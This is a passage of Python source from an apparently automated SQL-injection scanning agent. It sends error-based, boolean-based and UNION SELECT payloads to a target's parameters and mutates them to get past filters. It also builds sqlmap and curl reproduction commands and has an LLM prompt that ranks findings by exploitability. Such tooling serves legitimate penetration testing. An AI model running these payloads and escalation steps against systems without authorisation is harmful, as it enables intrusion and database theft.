            injection_type=sqlmap_result.get("type", technique),
            technique=technique,
            working_payload=working_payload,
            payload_encoded=working_payload,
            exploit_url=exploit_url,
            exploit_url_encoded=exploit_url_encoded,
            dbms_detected=dbms,
            columns_detected=details.get("columns_count"),
            extracted_databases=details.get("databases", []),
            extracted_tables=details.get("tables", []),
            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique={technique[0].upper()}",
            curl_command=curl_cmd,
            sqlmap_reproduce_command=sqlmap_result.get("reproduction_command", ""),
            validated=True,
            status="VALIDATED_CONFIRMED",
            evidence={
                "sqlmap_confirmed": True,
                "db_type": dbms,
                "raw_output": sqlmap_result.get("output_snippet", "")[:1000]
            },
            reproduction_steps=self._generate_repro_steps(self.url, param, working_payload, curl_cmd)
        )

        return finding

    def _log_final_stats(self, findings: List):
        """Log final statistics."""
        dashboard.log(
            f"[{self.name}] Complete: {self._stats['params_tested']} params, "
            f"{self._stats['vulns_found']} vulns, {self._stats['oob_callbacks']} OOB callbacks",
            "SUCCESS" if findings else "INFO"
        )

    # =========================================================================
    # MAIN RUN LOOP
    # =========================================================================

    async def run_loop(self) -> Dict:
        """
        Multi-phase SQLi detection and validation.

        Phases:
        1. Initialize & baseline
        2. Filter detection
        3. High-priority parameter testing
        4. OOB SQLi testing
        5. Error-based / Boolean-based testing
        6. Time-based verification (only if needed)
        7. JSON body injection
        8. Second-order SQLi (if observation points provided)
        9. SQLMap fallback
        """
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🔍 Starting SQLi v3 scan on {self.url}", "INFO")

        findings = []

        # Use HTTPClientManager for proper timeout and connection management (v2.4)
        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            self._configure_session(session)

            try:
                await self._initialize_baseline(session)
                params = await self._extract_and_prioritize_params()

                dashboard.log(f"[{self.name}] Testing {len(params)} parameters (prioritized)", "INFO")

                findings = await self._test_all_parameters(session, params, findings)
                findings = await self._test_json_injection(session, findings)
                findings = await self._test_second_order_injection(session, params, findings)
                findings = await self._run_sqlmap_fallback(session, params, findings)

                self._log_final_stats(findings)

                return {
                    "vulnerable": len(findings) > 0,
                    "findings": findings,
                    "stats": self._stats
                }

            except Exception as e:
                logger.error(f"[{self.name}] SQLi scan failed: {e}", exc_info=True)
                return {"vulnerable": False, "findings": [], "error": str(e)}

    # =========================================================================
    # HELPER DETECTION METHODS
    # =========================================================================

    async def _test_error_based(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Test for error-based SQL injection."""
        base_url = self._get_base_url()

        error_payloads = [
            "'", "''", "\"", "' OR '1'='1", "' AND '1'='2",
            "1'", "1\"", "') OR ('1'='1", "1; SELECT 1",
        ]

        for payload in error_payloads:
            variants = self._mutate_payload_for_filters(payload)

            for variant in variants:
                finding = await self._test_error_payload(session, base_url, param, variant)
                if finding:
                    return finding

        return None

    async def _test_error_payload(self, session: aiohttp.ClientSession, base_url: str,
                                  param: str, variant: str) -> Optional[SQLiFinding]:
        """Test a single error-based payload."""
        try:
            test_url = self._build_url_with_param(base_url, param, variant)

            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()

                error_info = self._extract_info_from_error(content)

                if error_info.get("db_type"):
                    self._detected_db_type = error_info["db_type"]
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.sqli.error_found", {
                            "param": param,
                            "payload": variant[:80],
                            "db_type": error_info["db_type"],
                        })
                    return self._create_error_based_finding(param, variant, error_info)
        except Exception as e:
            logger.debug(f"Error-based test failed: {e}")

        return None

    def _create_error_based_finding(self, param: str, variant: str, error_info: Dict) -> SQLiFinding:
        """Create finding for error-based SQL injection."""
        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
        curl_cmd = f"curl '{exploit_url_encoded}'"

        return SQLiFinding(
            url=self.url,
            parameter=param,
            injection_type="error-based",
            technique="error_based",
            working_payload=variant,
            payload_encoded=variant,
            exploit_url=exploit_url,
            exploit_url_encoded=exploit_url_encoded,
            extracted_tables=error_info.get("tables_leaked", []),
            dbms_detected=error_info.get("db_type", "unknown"),
            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=E --batch",
            curl_command=curl_cmd,
            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=E",
            validated=True,
            status=self._determine_validation_status("error_based", {
                "sql_error_visible": True,
                "tables_leaked": error_info.get("tables_leaked", [])
            }),
            evidence={
                "sql_error_visible": True,
                **error_info
            },
            reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
        )

    async def _test_boolean_based(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Test for boolean-based blind SQL injection."""
        import difflib

        base_url = self._get_base_url()

        try:
            baseline_content = await self._fetch_content(session, base_url, param, "1")
            true_content = await self._fetch_content(session, base_url, param, "1' AND '1'='1")
            false_content = await self._fetch_content(session, base_url, param, "1' AND '1'='2")

            true_sim = difflib.SequenceMatcher(None, baseline_content, true_content).ratio()
            false_sim = difflib.SequenceMatcher(None, baseline_content, false_content).ratio()
            diff_ratio = abs(true_sim - false_sim)

            logger.debug(f"[{self.name}] Boolean test: true_sim={true_sim:.2f}, false_sim={false_sim:.2f}, diff={diff_ratio:.2f}")

            if self._is_boolean_vulnerable(true_sim, false_sim, diff_ratio):
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.boolean_diff", {
                        "param": param,
                        "true_sim": round(true_sim, 3),
                        "false_sim": round(false_sim, 3),
                        "diff_ratio": round(diff_ratio, 3),
                    })
                return self._create_boolean_finding(param, "1' AND '1'='1", diff_ratio, true_sim, false_sim)
        except Exception as e:
            logger.debug(f"Boolean-based test failed: {e}")

        return None

    async def _fetch_content(self, session: aiohttp.ClientSession, base_url: str,
                            param: str, value: str) -> str:
        """Fetch content for a given parameter value."""
        test_url = self._build_url_with_param(base_url, param, value)
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            return await resp.text()

    def _is_boolean_vulnerable(self, true_sim: float, false_sim: float, diff_ratio: float) -> bool:
        """Check if boolean-based SQL injection is present."""
        return true_sim > 0.9 and false_sim < 0.8 and diff_ratio > 0.15

    def _create_boolean_finding(self, param: str, payload: str, diff_ratio: float,
                               true_sim: float, false_sim: float) -> SQLiFinding:
        """Create finding for boolean-based SQL injection."""
        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
        curl_cmd = f"curl '{exploit_url_encoded}'"

        return SQLiFinding(
            url=self.url,
            parameter=param,
            injection_type="boolean-based",
            technique="boolean_based",
            working_payload=payload,
            payload_encoded=payload,
            exploit_url=exploit_url,
            exploit_url_encoded=exploit_url_encoded,
            dbms_detected=self._detected_db_type or "unknown",
            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=B --batch",
            curl_command=curl_cmd,
            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=B",
            validated=True,
            status=self._determine_validation_status("boolean_based", {"diff_ratio": diff_ratio}),
            evidence={
                "diff_ratio": diff_ratio,
                "true_similarity": true_sim,
                "false_similarity": false_sim,
            },
            reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
        )

    async def _test_union_based(self, session: aiohttp.ClientSession, param: str) -> Optional[SQLiFinding]:
        """
        Test for UNION-based SQL injection (User Request: 'NULL, NULL' detection).
        Tries to determine column count and inject visible data.
        """
        base_url = self._get_base_url()
        canary = f"BtAcI{int(time.time() % 1000)}"

        # Try 1 to 10 columns (common range)
        for cols in range(1, 11):
            # Construct payload: ' UNION SELECT NULL, NULL, 'canary', NULL -- 
            # AGENT UPDATE: Testing ALL positions to ensure consistency. 
            # Previous logic missed columns if they weren't first/middle/last.
            # 10 columns * 10 positions is manageable.
            
            for pos in range(cols):
                nulls = ["NULL"] * cols
                # Inject canary
                nulls[pos] = f"'{canary}'"
                payload = f"' UNION SELECT {','.join(nulls)}-- -"
                
                variants = self._mutate_payload_for_filters(payload)
                for variant in variants:
                    if await self._check_union_reflection(session, base_url, param, variant, canary):
                         return self._create_union_finding(param, variant, cols, pos)
        
        return None

    async def _check_union_reflection(self, session, base_url, param, payload, canary) -> bool:
        """Check if canary is reflected in response."""
        try:
            test_url = self._build_url_with_param(base_url, param, payload)
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                if canary in content:
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.sqli.union_found", {
                            "param": param,
                            "payload": payload[:80],
                            "canary": canary,
                        })
                    return True
        except Exception:
            pass
        return False

    def _create_union_finding(self, param: str, payload: str, cols: int, pos: int) -> SQLiFinding:
        """Create finding for UNION-based SQL injection."""
        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
        curl_cmd = f"curl '{exploit_url_encoded}'"
        
        return SQLiFinding(
            url=self.url,
            parameter=param,
            injection_type="union-based",
            technique="union_based",
            working_payload=payload,
            payload_encoded=payload,
            exploit_url=exploit_url,
            exploit_url_encoded=exploit_url_encoded,
            columns_detected=cols,
            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=U --batch",
            curl_command=curl_cmd,
            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=U",
            validated=True,
            status="VALIDATED_CONFIRMED",
            evidence={
                "data_extracted": True,
                "columns_found": cols,
                "canary_position": pos
            },
            reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
        )

    # =========================================================================
    # UTILITY METHODS
    # =========================================================================

    def _get_base_url(self) -> str:
        """Get base URL without query string."""
        parsed = urlparse(self.url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def _build_url_with_param(self, base_url: str, param: str, value: str) -> str:
        """Build URL with specific parameter value."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return f"{base_url}?{new_query}"

    def _extract_post_params(self, post_data: str) -> List[str]:
        """Extract parameter names from POST data."""
        params = []

        # URL-encoded
        if "=" in post_data:
            for pair in post_data.split("&"):
                if "=" in pair:
                    params.append(pair.split("=")[0])

        # JSON
        try:
            data = json.loads(post_data)
            if isinstance(data, dict):
                params.extend(data.keys())
        except Exception as e:
            logger.debug(f"operation failed: {e}")

        return params

    def _sqlmap_type_to_technique(self, sqlmap_type: str) -> str:
        """Convert SQLMap type to technique code."""
        sqlmap_type_lower = (sqlmap_type or "").lower()

        if "time" in sqlmap_type_lower or "sleep" in sqlmap_type_lower:
            return "time_based"
        if "error" in sqlmap_type_lower:
            return "error_based"
        if "boolean" in sqlmap_type_lower or "blind" in sqlmap_type_lower:
            return "boolean_based"
        if "union" in sqlmap_type_lower:
            return "union_based"
        if "stack" in sqlmap_type_lower:
            return "stacked"

        return "error_based"

    def _get_sqlmap_technique_hint(self, ai_suggestion: str) -> str:
        """Convert AI's suggested technique to SQLMap technique codes.

        Args:
            ai_suggestion: Technique suggestion from Gemini/LLM (e.g., "union", "time-based")

        Returns:
            SQLMap technique codes (E=Error, B=Boolean, U=Union, T=Time, S=Stacked, Q=Inline)
        """
        ai_lower = (ai_suggestion or "").lower()

        # Map AI suggestions to SQLMap technique codes
        if "union" in ai_lower:
            return "U"  # Try Union first
        if "time" in ai_lower or "sleep" in ai_lower or "blind" in ai_lower:
            return "BT"  # Boolean + Time for blind
        if "error" in ai_lower:
            return "E"  # Error-based
        if "boolean" in ai_lower:
            return "B"  # Boolean-based
        if "stack" in ai_lower:
            return "S"  # Stacked queries

        # Default: try all common techniques (prioritizing faster ones)
        return "EBUT"  # Error, Boolean, Union, Time (in order of speed)

    def _get_technique_name(self, technique: str) -> str:
        """Get human-readable technique name."""
        names = {
            "error_based": "Error-Based",
            "time_based": "Time-Based Blind",
            "boolean_based": "Boolean-Based Blind",
            "union_based": "UNION-Based",
            "stacked": "Stacked Queries",
            "oob": "Out-of-Band",
            "second_order": "Second-Order",
        }
        return names.get(technique, "Unknown")

    # =========================================================================
    # WET → DRY TWO-PHASE PROCESSING
    # =========================================================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """
        Phase A: Global analysis of WET list with LLM-powered deduplication.

        Steps:
        1. Wait for queue to have items (polling loop)
        2. Drain ALL items from queue until stable empty (WET list)
        3. Load global context (Nuclei tech stack, discovered URLs)
        4. Call LLM with expert system prompt for deduplication
        5. LLM returns DRY list (deduplicated findings)
        6. Save DRY list to self._dry_findings

        Returns:
            List of unique findings (DRY list) to attack in Phase B
        """
        from bugtrace.core.llm_client import llm_client
        import time

        queue = queue_manager.get_queue("sqli")
        wet_findings = []

        # 1. Wait for queue to have items (max 300s - matches _wait_for_specialist_queues timeout)
        logger.info(f"[{self.name}] Phase A: Waiting for queue to receive items...")
        wait_start = time.monotonic()
        max_wait = 300.0  # 300 seconds max wait (matches PHASE 4 timeout)

        while (time.monotonic() - wait_start) < max_wait:
            depth = queue.depth() if hasattr(queue, 'depth') else 0
            if depth > 0:
                logger.info(f"[{self.name}] Phase A: Queue has {depth} items, starting drain...")
                break
            await asyncio.sleep(0.5)  # Check every 500ms
        else:
            logger.info(f"[{self.name}] Phase A: No items received after {max_wait}s")
            return []

        # 2. Drain ALL items until queue is stable empty
        empty_count = 0
        max_empty_checks = 10  # Queue must be empty for 10 consecutive checks (5s)

        while empty_count < max_empty_checks:
            item = await queue.dequeue(timeout=0.5)  # 500ms timeout per item

            if item is None:
                empty_count += 1
                await asyncio.sleep(0.5)  # Wait before next check
                continue

            # Reset empty counter - queue is still receiving items
            empty_count = 0

            # Extract finding data
            finding = item.get("finding", {})
            wet_findings.append({
                "url": finding.get("url", ""),
                "parameter": finding.get("parameter", ""),
                "technique": finding.get("technique", ""),
                "priority": item.get("priority", 0),
                "finding_data": finding  # Keep full finding for Phase B
            })

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            logger.info(f"[{self.name}] Phase A: No findings in WET list")
            return []

        # ========== AUTONOMOUS PARAMETER DISCOVERY ==========
        # Strategy: ALWAYS keep original WET params (DASTySAST signals) + ADD discovered params
        logger.info(f"[{self.name}] Phase A: Expanding WET findings with SQLi-focused discovery...")
        expanded_wet_findings = []
        seen_urls = set()
        seen_params = set()  # Track (url, param) to avoid duplicates

        # 1. Always include ALL original WET params first (they have DASTySAST confidence)
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            param = wet_item.get("parameter", "") or (wet_item.get("finding_data", {}) or wet_item.get("finding", {})).get("parameter", "")
            if param and (url, param) not in seen_params:
                seen_params.add((url, param))
                expanded_wet_findings.append(wet_item)

        # 2. Discover additional params per unique URL
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                all_params = await self._discover_sqli_params(url)
                if not all_params:
                    continue

                new_count = 0
                for param_name, param_value in all_params.items():
                    if (url, param_name) not in seen_params:
                        seen_params.add((url, param_name))
                        expanded_wet_findings.append({
                            "url": url,
                            "parameter": param_name,
                            "technique": wet_item.get("technique", ""),
                            "priority": wet_item.get("priority", 0),
                            "finding_data": wet_item.get("finding_data", {}),
                            "_discovered": True
                        })
                        new_count += 1

                if new_count:
                    logger.info(f"[{self.name}] 🔍 Discovered {new_count} additional params on {url}")

            except Exception as e:
                logger.error(f"[{self.name}] Discovery failed for {url}: {e}")

        # 2.5 Resolve endpoint URLs from HTML links/forms + reasoning fallback
        # Params like "artist" may belong to /artists.php, not the base URL
        from bugtrace.agents.specialist_utils import resolve_param_endpoints, resolve_param_from_reasoning
        if hasattr(self, '_last_discovery_html') and self._last_discovery_html:
            for base_url in seen_urls:
                endpoint_map = resolve_param_endpoints(self._last_discovery_html, base_url)
                # Fallback: extract endpoints from DASTySAST reasoning text
                reasoning_map = resolve_param_from_reasoning(expanded_wet_findings, base_url)
                for k, v in reasoning_map.items():
                    if k not in endpoint_map:
                        endpoint_map[k] = v
                if endpoint_map:
                    resolved_count = 0
                    for item in expanded_wet_findings:
                        if item.get("url") == base_url:
                            param = item.get("parameter", "")
                            if param in endpoint_map and endpoint_map[param] != base_url:
                                item["url"] = endpoint_map[param]
                                resolved_count += 1
                    if resolved_count:
                        logger.info(f"[{self.name}] 🔗 Resolved {resolved_count} params to actual endpoint URLs")

        logger.info(f"[{self.name}] Phase A: Expanded {len(wet_findings)} hints → {len(expanded_wet_findings)} testable params")

        # Replace wet_findings with expanded list
        wet_findings = expanded_wet_findings

        # 3. Load global context with tech stack from recon (v3.2)
        tech_stack = self._tech_stack_context or {"db": "generic", "server": "generic", "lang": "generic"}
        context = {
            "target_url": self.url or "unknown",
            "wet_count": len(wet_findings),
            "tech_stack": tech_stack,
            "tech_context_prompt": self.generate_dedup_context(tech_stack) if tech_stack.get("db") != "generic" else "",
            "prime_directive": self._prime_directive or "",
        }

        # 4. Call LLM for global analysis
        dry_list = await self._llm_analyze_and_dedup(wet_findings, context)

        # 5. Save DRY list
        self._dry_findings = dry_list

        logger.info(f"[{self.name}] Phase A: Deduplication complete. {len(wet_findings)} WET → {len(dry_list)} DRY ({len(wet_findings) - len(dry_list)} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(
        self,
        wet_findings: List[Dict],
        context: Dict
    ) -> List[Dict]:
        """
        Call LLM to analyze WET list and generate DRY list (v3.2: Context-Aware).

        Uses: llm_client from bugtrace.core.llm_client with SQLi expert prompt.
        Incorporates tech stack context for intelligent database-specific filtering.
        """
        from bugtrace.core.llm_client import llm_client

        # Extract tech stack info for prompt
        tech_stack = context.get('tech_stack', {})
        db_type = tech_stack.get('db', 'generic') if isinstance(tech_stack, dict) else 'generic'
        server = tech_stack.get('server', 'generic') if isinstance(tech_stack, dict) else 'generic'
        lang = tech_stack.get('lang', 'generic') if isinstance(tech_stack, dict) else 'generic'

        # Build tech context section
        tech_context_section = context.get('tech_context_prompt', '')
        prime_directive = context.get('prime_directive', '')

        # Build system prompt with SQLi expert rules + tech context (v3.2)
        system_prompt = f"""You are an expert SQL Injection security analyst.

{prime_directive}

{tech_context_section}

## TARGET CONTEXT
- Target: {context['target_url']}
- Detected Database: {db_type}
- Detected Server: {server}
- Detected Language: {lang}

## WET LIST ({context['wet_count']} potential findings):
{json.dumps(wet_findings, indent=2)}

## TASK
1. Analyze each finding for real exploitability based on the detected tech stack
2. Identify attack paths worth testing - prioritize {db_type}-compatible techniques
3. Apply expert deduplication rules:
   - **CRITICAL - Autonomous Discovery:**
     * If items have "_discovered": true, they are DIFFERENT PARAMETERS discovered autonomously
     * Even if they share the same "finding_data" object, treat them as SEPARATE based on "parameter" field
     * Same URL + DIFFERENT param → DIFFERENT (keep all)
     * Same URL + param + DIFFERENT context → DIFFERENT (keep both)
   - **Standard Deduplication:**
     * Cookie-based SQLi: GLOBAL scope (same cookie on different URLs = DUPLICATE)
     * Header-based SQLi: GLOBAL scope (same header on different URLs = DUPLICATE)
     * URL param SQLi: PER-ENDPOINT scope (same param on different URLs = DIFFERENT)
     * POST param SQLi: PER-ENDPOINT scope (same param on different endpoints = DIFFERENT)
     * Same URL + Same param + Same context → DUPLICATE (keep best)
4. Filter OUT findings incompatible with {db_type} (if known)
5. Return DRY list in JSON format

## EXAMPLES
- Cookie: TrackingId @ /blog/post?id=3 = Cookie: TrackingId @ /catalog?id=1 (DUPLICATE - same injection point)
- URL param 'id' @ /blog/post?id=3 ≠ URL param 'id' @ /catalog?id=1 (DIFFERENT - separate endpoints)

## OUTPUT FORMAT (JSON only, no markdown):
{{
  "dry_findings": [
    {{
      "url": "...",
      "parameter": "...",
      "rationale": "why this is unique and exploitable for {db_type}",
      "attack_priority": 1-5,
      "recommended_technique": "error_based|union|boolean|time_based|oob"
    }}
  ],
  "duplicates_removed": <count>,
  "tech_filtered": <count of findings filtered due to incompatible db>,
  "reasoning": "Brief explanation of deduplication strategy"
}}"""

        try:
            response = await llm_client.generate(
                system=system_prompt,
                user="Analyze the WET list above and return DRY findings in JSON format.",
                response_format="json"
            )

            # Parse LLM response
            dry_data = json.loads(response)
            dry_list = dry_data.get("dry_findings", [])

            logger.info(f"[{self.name}] LLM deduplication: {dry_data.get('reasoning', 'No reasoning provided')}")

            return dry_list

        except Exception as e:
            logger.error(f"[{self.name}] LLM deduplication failed: {e}. Falling back to fingerprint dedup.")
            # Fallback: Use fingerprint-based deduplication
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """Fallback deduplication using fingerprints if LLM fails."""
        seen_fingerprints = set()
        dry_list = []

        for finding in wet_findings:
            fingerprint = self._generate_sqli_fingerprint(
                finding["parameter"],
                finding["url"]
            )

            if fingerprint not in seen_fingerprints:
                seen_fingerprints.add(fingerprint)
                dry_list.append(finding)

        logger.info(f"[{self.name}] Fallback fingerprint dedup: {len(wet_findings)} → {len(dry_list)}")
        return dry_list

    async def exploit_dry_list(self) -> List[Dict]:
        """
        Phase B: Attack each DRY finding with 7-level escalation pipeline.

        v3.4: Progressive escalation from cheap (L0: 1 req) to expensive (L6: SQLMap Docker).
        Stops at the first level that confirms SQLi - no wasted Docker time.

        Levels:
            L0: WET payload (1 req)
            L1: Error-based (~20 reqs)
            L2: Boolean + Union (~103 reqs)
            L3: OOB + Time-based (~10 + wait)
            L4: LLM x WAF bypass (~100 reqs)
            L5: HTTP Manipulator (~2000 reqs)
            L6: SQLMap Docker (2-5 min)

        Returns:
            List of validated findings
        """
        results = []

        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings (v3.4 escalation)...")

        for dry_item in self._dry_findings:
            url = dry_item.get("url")
            param = dry_item.get("parameter")

            if not url or not param:
                continue

            # Configure agent for this specific test
            self.url = url
            self.param = param

            # Route by param type: Cookie, Header, or URL param
            if param.startswith("Cookie:"):
                cookie_name = param.replace("Cookie:", "").strip()
                result = await self._test_cookie_sqli_from_queue(url, cookie_name, dry_item)
            elif param.startswith("Header:"):
                header_name = param.replace("Header:", "").strip()
                result = await self._test_header_sqli(url, header_name, dry_item)
            else:
                result = await self._sqli_escalation_pipeline(url, param, dry_item)

            if result:
                # Validate payload has SQL syntax before emitting
                finding_dict = {
                    "type": "SQLI",
                    "url": result.url,
                    "parameter": result.parameter,
                    "payload": result.working_payload,
                    "technique": result.injection_type,
                    "dbms": result.dbms_detected,
                    "evidence": {"data_extracted": True},  # Minimal evidence for validation
                    "status": "VALIDATED_CONFIRMED",  # Required for final report inclusion
                    "validated": True
                }

                is_valid, error_msg = self._validate_before_emit(finding_dict)
                if not is_valid:
                    logger.warning(f"[{self.name}] Finding rejected for {result.parameter}: {error_msg}")
                    continue

                self._emit_sqli_finding(
                    finding_dict,
                    status="VALIDATED_CONFIRMED",
                    needs_cdp=False
                )

                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.confirmed", {
                        "param": result.parameter,
                        "url": result.url,
                        "technique": result.injection_type,
                        "dbms": result.dbms_detected,
                        "payload_preview": result.working_payload[:80] if result.working_payload else "",
                    })

                logger.info(f"[{self.name}] Confirmed SQLi: {result.url}?{result.parameter} ({result.injection_type})")

                # Update Dashboard UI
                dashboard.add_finding(
                    "SQL Injection",
                    f"{result.url} [{result.parameter}] ({result.injection_type})",
                    "CRITICAL"
                )
                dashboard.log(f"[{self.name}] 🚨 SQLI CONFIRMED: {result.parameter} vulnerable via {result.injection_type}", "SUCCESS")

                results.append(finding_dict)

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(results)} validated findings")

        # Generate specialist report
        await self._generate_specialist_report(results)

        return results

    async def _generate_specialist_report(self, findings: List[Dict]) -> str:
        """
        Generate specialist report after exploitation.

        Steps:
        1. Summarize findings (validated vs pending)
        2. Technical analysis per finding
        3. Save to: reports/scan_{id}/specialists/sqli_report.json

        Returns:
            Path to generated report
        """
        from datetime import datetime
        from bugtrace.core.config import settings

        # v3.1: Use unified report_dir if injected, else fallback to scan_context
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1]
            scan_dir = settings.BASE_DIR / "reports" / scan_id
        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)

        # Build report
        report = {
            "agent": "SQLiAgent",
            "scan_id": self._scan_context.split("/")[-1],
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(findings) - len(self._dry_findings)),  # Estimate
                "dry_count": len(self._dry_findings),
                "duplicates_removed": max(0, len(self._dry_findings) - len(findings)),
                "analysis_duration_s": 0,  # TODO: Track timing
            },
            "phase_b": {
                "attacks_executed": len(self._dry_findings),
                "validated_confirmed": len([f for f in findings if f.get("status") == "VALIDATED_CONFIRMED"]),
                "validated_likely": 0,
                "pending_validation": len([f for f in findings if f.get("status") == "PENDING_VALIDATION"]),
                "exploitation_duration_s": 0,  # TODO: Track timing
            },
            "findings": findings
        }

        # Save report
        report_path = results_dir / "sqli_results.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

        return str(report_path)

    # =========================================================================
    # QUEUE CONSUMPTION MODE (PHASE 19)
    # =========================================================================

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        Start SQLiAgent in TWO-PHASE queue consumer mode (V3.1 architecture).

        Architecture:
        - Launched by _init_specialist_workers() with asyncio.gather()
        - Waits for ThinkingConsolidation to fill queue (max 300s)
        - Phase A: Drains ALL WET items → LLM deduplication → DRY list
        - Phase B: Attacks DRY list → Emits VULNERABILITY_DETECTED events
        - Returns when done (asyncio.gather() continues to next phase)

        WET → DRY Transformation:
        - Phase A: Read ALL WET files, LLM deduplication → DRY list
        - Phase B: Attack DRY list only → Generate specialist report
        """
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_progress,
            report_specialist_done,
            report_specialist_wet_dry,
            write_dry_file,
        )

        self._queue_mode = True
        self._scan_context = scan_context
        self._v = create_emitter("SQLiAgent", self._scan_context)

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")
        self._v.emit("exploit.sqli.started", {"url": self.url})

        # v3.2: Load context-aware tech stack for intelligent deduplication
        await self._load_tech_context()

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("sqli")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)

        # PHASE A: ANALYSIS & DEDUPLICATION
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        # Report WET→DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
        write_dry_file(self, dry_list, initial_depth, "sqli")

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.completed", {"dry_count": 0, "vulns": 0})
            report_specialist_done(self.name, processed=0, vulns=0)
            return

        logger.info(f"[{self.name}] DRY list: {len(dry_list)} unique findings to attack")

        # PHASE B: EXPLOITATION
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities
        vulns_count = len([r for r in results if r]) if results else 0

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )

        if hasattr(self, '_v'):
            self._v.emit("exploit.sqli.completed", {
                "dry_count": len(dry_list),
                "vulns": vulns_count,
            })

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")
        logger.info(f"[{self.name}] Specialist report saved to: {self._scan_context}/specialists/sqli_report.json")

    async def _load_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin to:
        1. Load tech_profile.json from report directory
        2. Normalize into db/server/lang context
        3. Generate prime directive for LLM prompts

        This context helps focus SQLi payloads on the detected database type.
        """
        # Resolve report directory
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            # Fallback: construct from scan_context
            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._prime_directive = ""
            return

        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._prime_directive = self.generate_context_prompt(self._tech_stack_context)

        db_type = self._tech_stack_context.get("db", "generic")
        logger.info(f"[{self.name}] Tech context loaded: db={db_type}, "
                   f"server={self._tech_stack_context.get('server', 'generic')}, "
                   f"lang={self._tech_stack_context.get('lang', 'generic')}")

        # Update detected database type for payload selection
        if db_type != "generic":
            self._detected_db_type = db_type

    async def _process_queue_item(self, item: dict) -> Optional[SQLiFinding]:
        """
        Process a single item from the sqli queue.

        Item structure (from ThinkingConsolidationAgent):
        {
            "finding": {
                "type": "SQL Injection",
                "url": "...",
                "parameter": "...",
                "technique": "...",  # Optional: error_based, time_based, etc.
            },
            "priority": 85.5,
            "scan_context": "scan_123",
            "classified_at": 1234567890.0
        }
        """
        finding = item.get("finding", {})
        url = finding.get("url")
        param = finding.get("parameter")

        if not url or not param:
            logger.warning(f"[{self.name}] Invalid queue item: missing url or parameter")
            return None

        # Configure self for this specific test
        self.url = url
        self.param = param

        # Route by param type: Cookie, Header, or URL param
        if param.startswith("Cookie:"):
            cookie_name = param.replace("Cookie:", "").strip()
            result = await self._test_cookie_sqli_from_queue(url, cookie_name, finding)
        elif param.startswith("Header:"):
